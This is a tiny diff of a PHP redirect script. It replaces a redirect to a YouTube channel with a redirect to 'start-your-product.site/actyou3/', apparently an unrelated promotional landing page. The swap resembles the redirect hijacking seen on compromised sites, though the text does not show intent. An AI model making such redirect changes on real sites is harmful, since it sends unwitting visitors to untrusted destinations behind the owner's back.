@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.youtube.com/channel/UCEgdi0XIXXZ-qJOFPf4JSKw?reload=9");
+header("Location: https://start-your-product.site/actyou3/");
 die();
 ?>
